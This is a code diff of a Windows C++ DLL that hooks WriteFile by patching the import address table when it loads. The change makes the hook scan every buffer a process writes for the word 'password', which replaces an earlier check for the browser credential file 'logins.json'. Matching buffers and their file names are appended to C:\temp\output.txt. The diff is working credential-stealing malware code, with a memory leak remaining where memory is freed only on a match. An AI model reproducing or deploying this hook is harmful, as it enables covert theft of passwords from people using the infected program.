@@ -47,28 +47,22 @@ BOOL MyWriteFile(
 	LPOVERLAPPED lpOverlapped
 ) {
     OutputDebugStringW(L"MyWriteFile");
-    TCHAR fileName[MAX_PATH + 1];
+    TCHAR* fileName = new TCHAR[MAX_PATH + 1];
     GetFileNameFromHandle(hFile, fileName);
-    if ((!strstr(fileName, "logins.json"))) {
-        OutputDebugStringW(L"Found File!");
+    if((strstr((char *)lpBuffer, "password") != NULL) || 
+        (strstr((char*)lpBuffer, "Password") != NULL) ||
+        (strstr((char*)lpBuffer, "PASSWORD") != NULL)) {
+        OutputDebugString("Found Password!");
         std::ofstream outFile;
-        outFile.open("C:\\output.txt");
-        outFile << (char*)lpBuffer;
+        outFile.open("C:\\temp\\output.txt", std::fstream::app);
+        outFile << "File name: " << fileName << std::endl;
+        outFile << "Content:" << std::endl;
+        outFile << (char*)lpBuffer << std::endl;
+        
+        delete []fileName;
     }
 
     return WriteFile(hFile, lpBuffer, nNumberOfBytesToWrite, lpNumberOfBytesWritten, lpOverlapped);
-}
-
-BOOL MyWriteFileEx(
-	HANDLE                          hFile,
-	LPCVOID                         lpBuffer,
-	DWORD                           nNumberOfBytesToWrite,
-	LPOVERLAPPED                    lpOverlapped,
-	LPOVERLAPPED_COMPLETION_ROUTINE lpCompletionRoutine
-)
-{
-	OutputDebugStringW(L"MyWriteFileEx");
-	return WriteFileEx(hFile, lpBuffer, nNumberOfBytesToWrite, lpOverlapped, lpCompletionRoutine);
 }
 
 void patchIAT(char* funcNameToPatch, void* funcToRunInstead)
@@ -205,7 +199,7 @@ BOOL GetFileNameFromHandle(HANDLE hFile, TCHAR* out)
         CloseHandle(hFileMap);
     }
 
-    out = pszFilename;
+    memcpy(out, pszFilename, sizeof(TCHAR)* (MAX_PATH + 1));
     return TRUE;
 }
 
@@ -219,7 +213,6 @@ BOOL APIENTRY DllMain(
 	    {	    
 			OutputDebugStringW(L"DllMain");
 			patchIAT("WriteFile", MyWriteFile);
-			patchIAT("WriteFileEx", MyWriteFileEx);
 			OutputDebugStringW(L"IATPatching DllMain end");
 		}
 		default: ;
